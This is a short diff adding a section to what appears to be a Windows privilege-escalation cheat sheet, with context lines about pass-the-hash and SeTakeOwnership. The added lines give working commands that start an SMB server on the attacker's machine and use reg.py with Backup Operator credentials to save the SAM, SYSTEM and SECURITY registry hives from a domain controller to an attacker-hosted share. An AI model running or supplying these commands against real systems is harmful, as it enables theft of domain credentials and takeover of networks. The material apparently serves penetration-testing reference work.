@@ -32,6 +32,17 @@
 
 #### TIP: We can also use evil-winrm for PtH attacks.
 
+## Alternate Method to transfer the Hives: reg.py  remotely on Linux
+
+ - python smbserver.py -smb2support share /tmp
+
+ - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'
+
+ - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'
+
+ - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'
+
+
 ## SeTakeOwnership
 
 #### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.
